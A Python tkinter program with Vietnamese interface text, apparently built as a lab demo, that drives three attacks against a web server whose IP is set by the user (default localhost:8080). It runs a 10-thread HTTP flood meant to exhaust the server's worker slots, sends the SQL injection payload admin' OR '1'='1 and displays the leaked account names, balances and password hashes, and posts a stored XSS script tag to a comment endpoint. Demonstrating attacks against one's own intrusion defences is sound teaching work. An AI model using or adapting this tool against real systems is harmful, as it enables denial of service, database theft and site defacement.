"""
run_attacker.py - Giao Diện Tấn Công Độc Lập Dành Cho Attacker
Chia rành rọt 3 phương pháp tấn công độc lập (KHÔNG GỘP), hiển thị hậu quả rõ rệt:
1. DoS Flood: Bật/Tắt dội tải liên tục, làm sập hoàn toàn 6/6 Worker Slots (Lỗi 503 / Timeout).
2. SQL Injection: Trích xuất trực tiếp CSDL và hiển thị bảng dữ liệu mật ($4,865,000).
3. XSS Attack: Chèn mã độc làm biến dạng diễn đàn.
Khi HIPS bật: Tất cả đều bị Windows Defender Firewall DROP sạch từ card mạng!
"""
import sys
import os
import time
import json
import socket
import threading
import urllib.request
import urllib.parse
import urllib.error
from pathlib import Path
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

BASE_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE_DIR))

# Thiết lập UTF-8
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


class AttackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("⚔️ TRUNG TÂM PHÁT ĐỘNG TẤN CÔNG (ATTACKER CLIENT SUITE)")
        self.root.geometry("1000x720")
        self.root.minsize(880, 620)

        # Trạng thái luồng DoS
        self.dos_running = False
        self.dos_threads = []
        self.dos_stop_event = threading.Event()
        self.dos_stats = {"sent": 0, "c503": 0, "dropped": 0}

        self._build_ui()

    def _build_ui(self):
        # Header
        header = tk.Frame(self.root, bg="#881337", height=55)
        header.pack(fill=tk.X)

        title = tk.Label(header, text="⚔️ BẢNG ĐIỀU KHIỂN TẤN CÔNG KIỂM THỬ AN NINH MẠNG",
                         font=("Segoe UI", 13, "bold"), fg="#fecdd3", bg="#881337")
        title.pack(side=tk.LEFT, padx=15, pady=10)

        sub = tk.Label(header, text="Công cụ Pentest độc lập đối kháng với NIDS/HIPS",
                       font=("Segoe UI", 9, "italic"), fg="#fda4af", bg="#881337")
        sub.pack(side=tk.RIGHT, padx=15, pady=10)

        container = tk.Frame(self.root, padx=15, pady=10)
        container.pack(fill=tk.BOTH, expand=True)

        # 1. Khung cấu hình mục tiêu (Target)
        target_frame = ttk.LabelFrame(container, text=" Thiết Lập Máy Chủ Mục Tiêu (Target / Victim) ", padding=8)
        target_frame.pack(fill=tk.X, pady=5)

        ttk.Label(target_frame, text="Địa chỉ IP Nạn nhân:").pack(side=tk.LEFT, padx=5)
        self.ent_ip = ttk.Entry(target_frame, width=20, font=("Segoe UI", 10, "bold"))
        self.ent_ip.insert(0, "127.0.0.1")
        self.ent_ip.pack(side=tk.LEFT, padx=5)

        ttk.Label(target_frame, text="Cổng:").pack(side=tk.LEFT, padx=5)
        self.ent_port = ttk.Entry(target_frame, width=8, font=("Segoe UI", 10))
        self.ent_port.insert(0, "8080")
        self.ent_port.pack(side=tk.LEFT, padx=5)

        btn_ping = ttk.Button(target_frame, text="🔍 Kiểm tra kết nối", command=self._test_connection)
        btn_ping.pack(side=tk.LEFT, padx=10)

        self.lbl_target_health = tk.Label(target_frame, text="Trạng thái: Chưa kiểm tra", fg="#64748b", font=("Segoe UI", 9, "bold"))
        self.lbl_target_health.pack(side=tk.LEFT, padx=10)

        # 2. KHỐI 1: TẤN CÔNG DoS (LÀM SẬP SERVER)
        dos_frame = ttk.LabelFrame(container, text=" 🔴 [PHƯƠNG PHÁP 1] TẤN CÔNG TỪ CHỐI DỊCH VỤ (DoS FLOOD - LÀM SẬP MÁY CHỦ) ", padding=10)
        dos_frame.pack(fill=tk.X, pady=5)

        dos_ctrl = tk.Frame(dos_frame)
        dos_ctrl.pack(fill=tk.X)

        self.btn_dos_start = tk.Button(
            dos_ctrl, text="💥 BẮT ĐẦU DỘI DoS (LÀM SẬP WEB)", font=("Segoe UI", 10, "bold"),
            bg="#dc2626", fg="white", activebackground="#b91c1c", activeforeground="white",
            padx=14, pady=6, cursor="hand2", command=self._start_dos
        )
        self.btn_dos_start.pack(side=tk.LEFT, padx=5)

        self.btn_dos_stop = tk.Button(
            dos_ctrl, text="⏹ DỪNG DoS (CHO WEB HỒI PHỤC)", font=("Segoe UI", 10, "bold"),
            bg="#cbd5e1", fg="#64748b", state=tk.DISABLED,
            padx=14, pady=6, cursor="hand2", command=self._stop_dos
        )
        self.btn_dos_stop.pack(side=tk.LEFT, padx=5)

        self.lbl_dos_status = tk.Label(
            dos_frame, text="Mô tả: Khi bấm dội DoS, 10 luồng song song sẽ dội liên tục làm kẹt cứng 6 worker slots. Bất kỳ ai vào web cũng bị đơ sập!",
            font=("Segoe UI", 9), fg="#94a3b8", anchor=tk.W
        )
        self.lbl_dos_status.pack(fill=tk.X, pady=4)

        # 3. KHỐI 2: TẤN CÔNG SQL INJECTION (CƯỚP CƠ SỞ DỮ LIỆU)
        sqli_frame = ttk.LabelFrame(container, text=" 🟠 [PHƯƠNG PHÁP 2] TẤN CÔNG SQL INJECTION (CƯỚP DỮ LIỆU CSDL) ", padding=10)
        sqli_frame.pack(fill=tk.X, pady=5)

        sqli_ctrl = tk.Frame(sqli_frame)
        sqli_ctrl.pack(fill=tk.X)

        self.btn_sqli = tk.Button(
            sqli_ctrl, text="🔑 KHAI THÁC SQL INJECTION (CƯỚP CSDL)", font=("Segoe UI", 10, "bold"),
            bg="#ea580c", fg="white", activebackground="#c2410c", activeforeground="white",
            padx=14, pady=6, cursor="hand2", command=self._execute_sqli
        )
        self.btn_sqli.pack(side=tk.LEFT, padx=5)

        self.lbl_sqli_status = tk.Label(
            sqli_ctrl, text="Payload: admin' OR '1'='1 ➔ Cướp danh sách tài khoản & số dư ngân hàng.",
            font=("Segoe UI", 9), fg="#94a3b8"
        )
        self.lbl_sqli_status.pack(side=tk.LEFT, padx=10)

        # Bảng hiển thị dữ liệu cướp được
        columns = ("id", "name", "user", "balance", "hash")
        self.tree_sqli = ttk.Treeview(sqli_frame, columns=columns, show="headings", height=4)
        self.tree_sqli.heading("id", text="ID")
        self.tree_sqli.heading("name", text="Họ và Tên")
        self.tree_sqli.heading("user", text="Tài Khoản")
        self.tree_sqli.heading("balance", text="Số Dư Ngân Hàng")
        self.tree_sqli.heading("hash", text="Mật Khẩu Băm (Hash)")

        self.tree_sqli.column("id", width=40, anchor=tk.CENTER)
        self.tree_sqli.column("name", width=220)
        self.tree_sqli.column("user", width=120)
        self.tree_sqli.column("balance", width=140, anchor=tk.CENTER)
        self.tree_sqli.column("hash", width=250)
        self.tree_sqli.pack(fill=tk.X, pady=4)

        # 4. KHỐI 3: TẤN CÔNG XSS (CHÈN MÃ ĐỘC)
        xss_frame = ttk.LabelFrame(container, text=" 🟡 [PHƯƠNG PHÁP 3] TẤN CÔNG CROSS-SITE SCRIPTING (XSS) ", padding=8)
        xss_frame.pack(fill=tk.X, pady=5)

        xss_ctrl = tk.Frame(xss_frame)
        xss_ctrl.pack(fill=tk.X)

        self.btn_xss = tk.Button(
            xss_ctrl, text="☣️ CHÈN MÃ ĐỘC XSS VÀO WEB", font=("Segoe UI", 10, "bold"),
            bg="#9333ea", fg="white", activebackground="#7e22ce", activeforeground="white",
            padx=14, pady=6, cursor="hand2", command=self._execute_xss
        )
        self.btn_xss.pack(side=tk.LEFT, padx=5)

        self.lbl_xss_status = tk.Label(
            xss_ctrl, text="Chèn script alert('PWNED') vào bảng tin máy chủ web.",
            font=("Segoe UI", 9), fg="#94a3b8"
        )
        self.lbl_xss_status.pack(side=tk.LEFT, padx=10)

        # 5. Khung Nhật Ký Chi Tiết
        log_frame = ttk.LabelFrame(container, text=" Nhật Ký Phản Hồi Từ Máy Chủ (Server Feedback) ", padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        self.log_text = scrolledtext.ScrolledText(log_frame, bg="#0d1117", fg="#c9d1d9",
                                                 insertbackground="white", font=("Consolas", 10), wrap=tk.WORD, height=6)
        self.log_text.pack(fill=tk.BOTH, expand=True)

        self.log_text.tag_config("SUCCESS", foreground="#34d399", font=("Consolas", 10, "bold"))
        self.log_text.tag_config("ERROR", foreground="#f87171", font=("Consolas", 10, "bold"))
        self.log_text.tag_config("INFO", foreground="#38bdf8")

    def _get_target(self):
        return self.ent_ip.get().strip(), int(self.ent_port.get().strip())

    def _test_connection(self):
        target_ip, target_port = self._get_target()
        url = f"http://{target_ip}:{target_port}/api/health"
        t0 = time.time()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Health/1.0"})
            with urllib.request.urlopen(req, timeout=2.0) as resp:
                elapsed = round((time.time() - t0) * 1000, 1)
                self.lbl_target_health.config(text=f"🟢 KẾT NỐI TỐT ({elapsed}ms)", fg="#16a34a")
                self.log_text.insert(tk.END, f"[✓] Kết nối tới http://{target_ip}:{target_port}/ thành công ({elapsed}ms)!\n", "SUCCESS")
        except urllib.error.HTTPError as e:
            if e.code == 503:
                self.lbl_target_health.config(text="🔴 MÁY CHỦ ĐANG SẬP (503)", fg="#dc2626")
                self.log_text.insert(tk.END, f"[!] Máy chủ đang bị sập DoS (HTTP 503)!\n", "ERROR")
            else:
                self.lbl_target_health.config(text=f"Lỗi: HTTP {e.code}", fg="#f59e0b")
        except Exception as e:
            self.lbl_target_health.config(text="⛔ KẾT NỐI BỊ DROP / TỪ CHỐI", fg="#dc2626")
            self.log_text.insert(tk.END, f"[!] Kết nối bị từ chối hoặc bị Tường lửa DROP sạch ({e})!\n", "ERROR")
        self.log_text.see(tk.END)

    # =========================================================================
    # LOGIC 1: DoS FLOOD (LIÊN TỤC CHO ĐẾN KHI DỪNG)
    # =========================================================================
    def _start_dos(self):
        if self.dos_running:
            return

        target_ip, target_port = self._get_target()
        self.dos_running = True
        self.dos_stop_event.clear()
        self.dos_stats = {"sent": 0, "c503": 0, "dropped": 0}

        self.btn_dos_start.config(state=tk.DISABLED, bg="#cbd5e1", fg="#64748b")
        self.btn_dos_stop.config(state=tk.NORMAL, bg="#b91c1c", fg="white")
        self.lbl_dos_status.config(text="🔥 Đang dội tải DoS liên tục bằng 10 luồng! Hãy kiểm tra trang web trên trình duyệt...", fg="#ef4444")

        self.log_text.insert(tk.END, f"\n[*] BẮT ĐẦU DỘI DoS VÀO http://{target_ip}:{target_port}/api/search...\n", "INFO")
        self.log_text.see(tk.END)

        def dos_worker():
            url = f"http://{target_ip}:{target_port}/api/search?q=dos_flood"
            while not self.dos_stop_event.is_set():
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "DoS-Client/2.0"})
                    with urllib.request.urlopen(req, timeout=1.5) as resp:
                        self.dos_stats["sent"] += 1
                except urllib.error.HTTPError as e:
                    self.dos_stats["sent"] += 1
                    if e.code == 503:
                        self.dos_stats["c503"] += 1
                except Exception:
                    self.dos_stats["sent"] += 1
                    self.dos_stats["dropped"] += 1
                time.sleep(0.04)

        self.dos_threads = [threading.Thread(target=dos_worker, daemon=True) for _ in range(10)]
        for t in self.dos_threads:
            t.start()

        # Luồng cập nhật trạng thái UI
        def update_ui_loop():
            while self.dos_running:
                time.sleep(0.5)
                sent = self.dos_stats["sent"]
                c503 = self.dos_stats["c503"]
                drop = self.dos_stats["dropped"]

                if drop > 15:
                    self.lbl_dos_status.config(
                        text=f"🛡️ BỊ HIPS CHẶN ĐỨNG: Windows Defender Firewall đã DROP {drop} gói tin!",
                        fg="#16a34a"
                    )
                elif c503 > 0:
                    self.lbl_dos_status.config(
                        text=f"🔥 MÁY CHỦ ĐÃ SẬP! Đã dội: {sent} gói | Nhận lỗi 503: {c503} kết nối | Web bị đơ liệt hoàn toàn!",
                        fg="#dc2626"
                    )
                else:
                    self.lbl_dos_status.config(
                        text=f"⚡ Đang dội tải DoS... Đã gửi: {sent} gói tin...",
                        fg="#f59e0b"
                    )

        threading.Thread(target=update_ui_loop, daemon=True).start()

    def _stop_dos(self):
        self.dos_running = False
        self.dos_stop_event.set()
        self.btn_dos_start.config(state=tk.NORMAL, bg="#dc2626", fg="white")
        self.btn_dos_stop.config(state=tk.DISABLED, bg="#cbd5e1", fg="#64748b")
        self.lbl_dos_status.config(text="⏹ Đã dừng dội DoS. Máy chủ đang dần hồi phục tài nguyên luồng.", fg="#64748b")
        self.log_text.insert(tk.END, f"[✓] Đã dừng DoS. Tổng số gói tin đã gửi: {self.dos_stats['sent']}.\n\n", "INFO")
        self.log_text.see(tk.END)

    # =========================================================================
    # LOGIC 2: SQL INJECTION (HIỂN THỊ CSDL ĐẦY ĐỦ)
    # =========================================================================
    def _execute_sqli(self):
        target_ip, target_port = self._get_target()
        payload = "admin' OR '1'='1"
        url = f"http://{target_ip}:{target_port}/api/login?user={urllib.parse.quote(payload)}&pass=arbitrary"

        self.log_text.insert(tk.END, f"[*] Gửi SQL Injection: {url}\n", "INFO")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "SQLi-Dumper/2.0"})
            with urllib.request.urlopen(req, timeout=3.0) as resp:
                data = json.loads(resp.read().decode())
                customers = data.get("leaked_database", [])

                # Xóa bảng cũ và nạp dữ liệu mới
                for row in self.tree_sqli.get_children():
                    self.tree_sqli.delete(row)

                for u in customers:
                    self.tree_sqli.insert("", tk.END, values=(u["id"], u["full_name"], u["username"], u["balance"], u["secret_hash"][:24] + "..."))

                total_bal = data.get("total_balance_leaked", "$4,865,000")
                self.lbl_sqli_status.config(
                    text=f"🔥 CƯỚP THÀNH CÔNG! Đã trích xuất {len(customers)} tài khoản VIP với tổng số dư {total_bal}!",
                    fg="#dc2626"
                )
                self.log_text.insert(tk.END, f"[🔥 SQLi THÀNH CÔNG] Đã cướp trọn CSDL! Tổng số dư lộ: {total_bal}\n", "SUCCESS")
                messagebox.showwarning("SQL Injection Thành Công", f"Đã cướp trọn cơ sở dữ liệu khách hàng!\nTổng số dư bị lộ: {total_bal}\nHãy nhìn vào trang Web :8080 để thấy cảnh báo đỏ!")

        except Exception as e:
            self.lbl_sqli_status.config(
                text=f"🛡️ THẤT BẠI: KẾT NỐI BỊ WINDOWS FIREWALL DROP SẠCH ({e})!",
                fg="#16a34a"
            )
            self.log_text.insert(tk.END, f"[🛡️ HIPS CHẶN ĐỨNG SQLi] Gói tin bị Tường lửa DROP! Không thể cướp dữ liệu ({e})\n", "ERROR")
            messagebox.showinfo("HIPS Phòng Vệ Thành Công", "Gói tin của bạn đã bị Windows Defender Firewall DROP sạch!\nKhông thể lấy được bất kỳ dữ liệu nào.")
        self.log_text.see(tk.END)

    # =========================================================================
    # LOGIC 3: XSS ATTACK
    # =========================================================================
    def _execute_xss(self):
        target_ip, target_port = self._get_target()
        script = "<script>alert('PWNED_BY_ATTACKER')</script>"
        url = f"http://{target_ip}:{target_port}/api/comment?author=Attacker_Pro&content={urllib.parse.quote(script)}"

        self.log_text.insert(tk.END, f"[*] Gửi XSS: {url}\n", "INFO")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "XSS-Attacker/2.0"})
            with urllib.request.urlopen(req, timeout=3.0) as resp:
                data = json.loads(resp.read().decode())
                self.lbl_xss_status.config(
                    text="🔥 XSS THÀNH CÔNG: Mã độc đã được lưu vào bảng tin trang chủ!",
                    fg="#dc2626"
                )
                self.log_text.insert(tk.END, f"[🔥 XSS THÀNH CÔNG] Mã độc JavaScript đã được lưu vào CSDL Web!\n", "SUCCESS")
                messagebox.showwarning("XSS Thành Công", "Mã độc đã lưu vào Web! Mở http://127.0.0.1:8080/ sẽ thấy giao diện bị biến dạng!")
        except Exception as e:
            self.lbl_xss_status.config(
                text=f"🛡️ THẤT BẠI: KẾT NỐI BỊ TƯỜNG LỬA HIPS DROP ({e})!",
                fg="#16a34a"
            )
            self.log_text.insert(tk.END, f"[🛡️ HIPS CHẶN ĐỨNG XSS] Kết nối bị ngắt từ card mạng ({e})\n", "ERROR")
        self.log_text.see(tk.END)


def main():
    root = tk.Tk()
    app = AttackerApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
